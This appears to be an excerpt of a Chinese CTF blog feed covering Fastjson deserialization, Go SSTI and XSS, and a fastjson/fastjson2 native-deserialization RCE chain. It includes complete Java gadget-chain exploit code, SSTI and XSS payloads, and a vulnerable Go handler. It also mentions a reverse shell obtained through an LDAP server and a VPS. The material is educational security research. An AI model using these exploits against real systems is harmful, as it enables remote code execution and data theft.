href="#第三次反序列化（也是反序列化成功的开始）" class="headerlink" title="第三次反序列化（也是反序列化成功的开始）"></a>第三次反序列化（也是反序列化成功的开始）</h3><p>先提前架起ldap服务和vps监听</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239279.png" alt="image-20230505022409515"></p><p>发送payload</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050240664.png" alt="image-20230505022432324"></p><p>通过了前面三个类的checkAutoType方法，来到BadAttributeValueExpException的readObject方法</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050240513.png" alt="image-20230505022631154"></p><p>接着触发getter</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050240832.png" alt="image-20230505022649684"></p><p>成功反弹shell</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050240730.png" alt="image-20230505022721373"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> java </tag>
            
            <tag> fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GO SSTI</title>
      <link href="/2023/03/13/GO-SSTI/"/>
      <url>/2023/03/13/GO-SSTI/</url>
      
        <content type="html"><![CDATA[<h1 id="GO-SSTI"><a href="#GO-SSTI" class="headerlink" title="GO SSTI"></a>GO SSTI</h1><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><h3 id="识别方法"><a href="#识别方法" class="headerlink" title="识别方法"></a>识别方法</h3><p>代码中引入了<code>text/template</code>，会导致SSTI漏洞出现</p><p>运算符号在<code>&#123;&#123;&#125;&#125;</code>中是非法的，需要使用其他payload，比如占位符号<code>&#123;&#123;.&#125;&#125;</code>,如果存在ssti，那么就无回显</p><h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br><span class="hljs-string">&quot;strings&quot;</span><br><span class="hljs-string">&quot;text/template&quot;</span><br>)<br><br><span class="hljs-keyword">type</span> User <span class="hljs-keyword">struct</span> &#123;<br>Id     <span class="hljs-type">int</span><br>Name   <span class="hljs-type">string</span><br>Passwd <span class="hljs-type">string</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">StringTplExam</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>user := &amp;User&#123;<span class="hljs-number">1</span>, <span class="hljs-string">&quot;tyskill&quot;</span>, <span class="hljs-string">&quot;tyskill&quot;</span>&#125;<br>r.ParseForm()<br>arg := strings.Join(r.PostForm[<span class="hljs-string">&quot;name&quot;</span>], <span class="hljs-string">&quot;&quot;</span>)<br>tpl1 := fmt.Sprintf(<span class="hljs-string">`&lt;h1&gt;Hi, `</span> + arg + <span class="hljs-string">`&lt;/h1&gt; Your name is &#123;&#123; .Name &#125;&#125;`</span>)<br>html, err := template.New(<span class="hljs-string">&quot;login&quot;</span>).Parse(tpl1)<br>html = template.Must(html, err)<br>html.Execute(w, user)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>server := http.Server&#123;<br>Addr: <span class="hljs-string">&quot;127.0.0.1:8080&quot;</span>,<br>&#125;<br>http.HandleFunc(<span class="hljs-string">&quot;/string&quot;</span>, StringTplExam)<br>server.ListenAndServe()<br>&#125;<br><br></code></pre></td></tr></table></figure><p>go通过结构体来类比一个对象，一个子段就是一个对象的属性，模版渲染也支持传入一个结构体的实例来渲染字段，上面代码中，name部分可控，可以仿造<code>&#123;&#123; .Name&#125;&#125;</code>，构造<code>&#123;&#123;.Passw&#125;&#125;</code>，得到Passwd字段</p><p><code>user := &amp;User&#123;1, &quot;tyskill&quot;, &quot;tyskill&quot;&#125;</code>使用了模版<code>&amp;User</code>因此<code>&#123;&#123;.Passwd&#125;&#125;</code>可以得到它的属性</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032243822.png" alt="image-20230413215152150"></p><p>直接用.可以得到模版的全部内容</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032244524.png" alt="image-20230413215255743"></p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>拒绝拼接，直接传入.字段名</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">StringTpl2Exam</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>user := &amp;User&#123;<span class="hljs-number">1</span>, <span class="hljs-string">&quot;tyskill&quot;</span>, <span class="hljs-string">&quot;tyskill&quot;</span>&#125;<br>r.ParseForm()<br>arg := strings.Join(r.PostForm[<span class="hljs-string">&quot;name&quot;</span>], <span class="hljs-string">&quot;&quot;</span>)<br>tpl := <span class="hljs-string">`&lt;h1&gt;Hi, &#123;&#123; .arg &#125;&#125;&lt;/h1&gt;&lt;br&gt;Your name is &#123;&#123; .Name &#125;&#125;`</span><br>data := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>&#123;<br><span class="hljs-string">&quot;arg&quot;</span>:  arg,<br><span class="hljs-string">&quot;Name&quot;</span>: user.Name,<br>&#125;<br>html := template.Must(template.New(<span class="hljs-string">&quot;login&quot;</span>).Parse(tpl))<br>html.Execute(w, data)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>go模版会打印字符串，如果是xss代码的话，也会直接执行，这个xss是拒绝拼接也无法防御的</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">&#123;&#123;<span class="hljs-string">&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;</span>&#125;&#125;<br>&#123;&#123;<span class="hljs-built_in">print</span> <span class="hljs-string">&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p>编码行为</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">&#123;&#123;define <span class="hljs-string">&quot;T1&quot;</span>&#125;&#125;ONE&#123;&#123;end&#125;&#125;&#123;&#123;template <span class="hljs-string">&quot;T1&quot;</span>&#125;&#125;<br>即&#123;&#123;define <span class="hljs-string">&quot;T1&quot;</span>&#125;&#125;&lt;script&gt;alert(<span class="hljs-number">1</span>)&lt;/script&gt;&#123;&#123;end&#125;&#125; &#123;&#123;template <span class="hljs-string">&quot;T1&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><ul><li><code>&#123;template &quot;name&quot;&#125;&#125;</code> 执行名为name的模板，提供给模板的参数为nil，如模板不存在输出为””</li><li><code>&#123;&#123;define "name"&#125;`模板内容`&#123;&#123;end&#125;&#125;&#125;</code>定义一个名为name的模板</li></ul><p>这里实际上就是一个我们进行模板的定义，并输出的过程，这样我们就可以顺利的实现XSS了</p><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>1.内置函数html转义特殊字符</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">&#123;&#123;html <span class="hljs-string">&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;</span>&#125;&#125;<br>&#123;&#123;js <span class="hljs-string">&quot;js代码&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p>2.<code>text/template</code>在模版处理阶段还定义<code>template.HTMLEscapeString</code>等转义函数</p><p>3.<code>html/template</code>模版包自带转义效果</p><h2 id="命令执行-amp-任意文件读取"><a href="#命令执行-amp-任意文件读取" class="headerlink" title="命令执行&amp;任意文件读取"></a>命令执行&amp;任意文件读取</h2><p>可以像<code>&#123;&#123; .Name&#125;&#125;</code>一样调用对象方法，模板内部并不存在可以RCE的函数，所以除非有人为渲染对象定义了RCE或文件读取的方法，不然这个问题是不存在的。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(u *User)</span></span> System(cmd <span class="hljs-type">string</span>, arg ...<span class="hljs-type">string</span>) <span class="hljs-type">string</span> &#123;<br>out, _ := exec.Command(cmd, arg...).CombinedOutput()<br><span class="hljs-keyword">return</span> <span class="hljs-type">string</span>(out)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(u *User)</span></span> FileRead(File <span class="hljs-type">string</span>) <span class="hljs-type">string</span> &#123;<br>data, err := ioutil.ReadFile(File)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Print(<span class="hljs-string">&quot;File read error&quot;</span>)<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-type">string</span>(data)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>如果定义了就可以通过<code>&#123;&#123;.System "whoami"&#125;&#125;</code>和<code>&#123;&#123;.FileRead "filepath"&#125;&#125;</code>执行</p><blockquote><p>正常程序猿都不会定义这么危险的函数</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FastJson与原生反序列化</title>
      <link href="/2023/02/04/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/02/04/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="FastJson与原生反序列化"><a href="#FastJson与原生反序列化" class="headerlink" title="FastJson与原生反序列化"></a>FastJson与原生反序列化</h1><h2 id="第一版-lt-1-2-49"><a href="#第一版-lt-1-2-49" class="headerlink" title="第一版 &lt;1.2.49"></a>第一版 &lt;1.2.49</h2><p>在Json类当中的toString方法能触发toJsonString的调用，而这个东西其实我们并不陌生，在我们想用JSON.parse()触发get方法时，其中一个处理方法就是用JSONObject嵌套我们的payload</p><p>触发toString-&gt;toJSONString-&gt;get方法</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032239697.png" alt="image-20230421235341029"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;open -na Calculator\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;y4tacker&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valfield.setAccessible(<span class="hljs-literal">true</span>);<br>        valfield.set(val, jsonArray);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(val);<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="fastjson2-全版本"><a href="#fastjson2-全版本" class="headerlink" title="fastjson2 全版本"></a>fastjson2 全版本</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson2.JSONArray;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;open -na Calculator\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;y4tacker&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valfield.setAccessible(<span class="hljs-literal">true</span>);<br>        valfield.set(val, jsonArray);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(val);<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="绕过resolveClass"><a href="#绕过resolveClass" class="headerlink" title="绕过resolveClass"></a>绕过resolveClass</h2><h3 id="查看不会调用的情况"><a href="#查看不会调用的情况" class="headerlink" title="查看不会调用的情况"></a>查看不会调用的情况</h3><p>跟进<code>java.io.ObjectInputStream#readObject0</code>,会根据读到的bytes中tc的数据类型做不同的处理去恢复部分对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">switch</span> (tc) &#123;<br>                <span class="hljs-keyword">case</span> TC_NULL:<br>                    <span class="hljs-keyword">return</span> readNull();<br>                <span class="hljs-keyword">case</span> TC_REFERENCE:<br>                    <span class="hljs-keyword">return</span> readHandle(unshared);<br>                <span class="hljs-keyword">case</span> TC_CLASS:<br>                    <span class="hljs-keyword">return</span> readClass(unshared);<br>                <span class="hljs-keyword">case</span> TC_CLASSDESC:<br>                <span class="hljs-keyword">case</span> TC_PROXYCLASSDESC:<br>                    <span class="hljs-keyword">return</span> readClassDesc(unshared);<br>                <span class="hljs-keyword">case</span> TC_STRING:<br>                <span class="hljs-keyword">case</span> TC_LONGSTRING:<br>                    <span class="hljs-keyword">return</span> checkResolve(readString(unshared));<br>                <span class="hljs-keyword">case</span> TC_ARRAY:<br>                    <span class="hljs-keyword">return</span> checkResolve(readArray(unshared));<br>                <span class="hljs-keyword">case</span> TC_ENUM:<br>                    <span class="hljs-keyword">return</span> checkResolve(readEnum(unshared));<br>                <span class="hljs-keyword">case</span> TC_OBJECT:<br>                    <span class="hljs-keyword">return</span> checkResolve(readOrdinaryObject(unshared));<br>                <span class="hljs-keyword">case</span> TC_EXCEPTION:<br>                    <span class="hljs-type">IOException</span> <span class="hljs-variable">ex</span> <span class="hljs-operator">=</span> readFatalException();<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WriteAbortedException</span>(<span class="hljs-string">&quot;writing aborted&quot;</span>, ex);<br>                <span class="hljs-keyword">case</span> TC_BLOCKDATA:<br>                <span class="hljs-keyword">case</span> TC_BLOCKDATALONG:<br>                    <span class="hljs-keyword">if</span> (oldMode) &#123;<br>                        bin.setBlockDataMode(<span class="hljs-literal">true</span>);<br>                        bin.peek();             <span class="hljs-comment">// force header read</span><br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OptionalDataException</span>(<br>                            bin.currentBlockRemaining());<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StreamCorruptedException</span>(<br>                            <span class="hljs-string">&quot;unexpected block data&quot;</span>);<br>                    &#125;<br>                <span class="hljs-keyword">case</span> TC_ENDBLOCKDATA:<br>                    <span class="hljs-keyword">if</span> (oldMode) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OptionalDataException</span>(<span class="hljs-literal">true</span>);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StreamCorruptedException</span>(<br>                            <span class="hljs-string">&quot;unexpected end of block data&quot;</span>);<br>                    &#125;<br>                <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StreamCorruptedException</span>(<br>                        String.format(<span class="hljs-string">&quot;invalid type code: %02X&quot;</span>, tc));<br>            &#125;<br></code></pre></td></tr></table></figure><p>上面的不同case中大部分类都会最终调用<code>readClassDesc</code>去获取类的描述符，在这个过程中如果当前反序列化数据下一位仍然是<code>TC_CLASSDESC</code>那么就会在<code>readNonProxyDesc</code>中触发<code>resolveClass</code></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032239877.png" 